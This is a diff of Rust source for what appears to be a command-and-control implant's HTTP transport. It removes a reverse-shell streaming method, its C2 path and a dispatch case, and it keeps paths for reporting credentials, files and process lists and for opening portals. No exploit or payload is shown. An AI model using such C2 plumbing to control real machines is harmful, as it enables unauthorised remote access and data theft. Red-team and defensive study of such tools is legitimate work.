@@ -89,7 +89,6 @@ static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
-static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 // Marshal: Encode and encrypt a message using the ChachaCodec
@@ -691,27 +690,6 @@ impl Transport for HTTP {
         self.unary_rpc(request, REPORT_OUTPUT_PATH).await
     }
 
-    async fn reverse_shell(
-        &mut self,
-        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        // Spawn polling loop in background and return immediately.
-        // The caller (pty.rs) expects reverse_shell() to return so the input
-        // handling loop can run concurrently, matching the gRPC transport behavior.
-        let transport = self.clone();
-        tokio::spawn(async move {
-            if let Err(_err) = transport
-                .handle_short_poll_streaming(rx, tx, REVERSE_SHELL_PATH)
-                .await
-            {
-                #[cfg(feature = "print_debug")]
-                log::error!("reverse_shell short poll streaming ended: {}", _err);
-            }
-        });
-        Ok(())
-    }
-
     async fn create_portal(
         &mut self,
         rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
@@ -842,7 +820,7 @@ impl Transport for HTTP {
                     .await
                     .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
             }
-            "ReverseShell" | "CreatePortal" => {
+            "CreatePortal" => {
                 let (mut req_tx, body) = hyper_legacy::Body::channel();
 
                 tokio::spawn(async move {
